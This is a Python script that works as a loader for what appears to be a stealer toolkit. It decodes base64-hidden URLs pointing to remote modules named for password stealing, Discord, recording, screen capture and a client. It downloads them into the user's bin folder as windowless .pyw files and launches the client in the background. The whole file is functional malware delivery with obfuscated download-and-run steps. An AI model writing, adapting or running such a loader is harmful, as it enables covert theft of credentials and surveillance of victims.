import os
import subprocess
import sys
import time
import shutil
import base64
import requests

bin_folder = f"C:/Users/{os.getlogin()}/bin"

# Download all components
components = [
    {"name": "computer.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1jb21wdXRlci5weQ==').decode('utf-8')},
    {"name": "disc.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1kaXNjb3JkLnB5').decode('utf-8')},
    {"name": "record.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1yZWNvcmQucHk=').decode('utf-8')},
    {"name": "password.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1zdGVhbGVyLnB5').decode('utf-8')},
    {"name": "screen.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1zY3JlZW4ucHk=').decode('utf-8')},
    {"name": "client.pyw", "url": base64.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Rhem9tby90ZXN0LXJlcC9yZWZzL2hlYWRzL21hc3Rlci9nZXRicmFpbi9nZXRicmFpbi1jbGllbnQucHk=').decode('utf-8')}
]

for component in components:
    for component in components:
        name = component["name"]
        url = component["url"]

        try:
            response = requests.get(url)
            response.raise_for_status()

            with open(f"{bin_folder}/{name}", "w", encoding="utf-8") as file:
                file.write(response.text)

        except requests.exceptions.RequestException as e:
            pass

try:
    output = subprocess.check_output(["py", "--version"], stderr=subprocess.STDOUT)
    prefixe = "py"
except:
    try:
        output = subprocess.check_output(["python", "--version"], stderr=subprocess.STDOUT)
        prefixe = "python"
    except:
        print("001")

process = subprocess.Popen([prefixe, f'{bin_folder}/client.pyw'])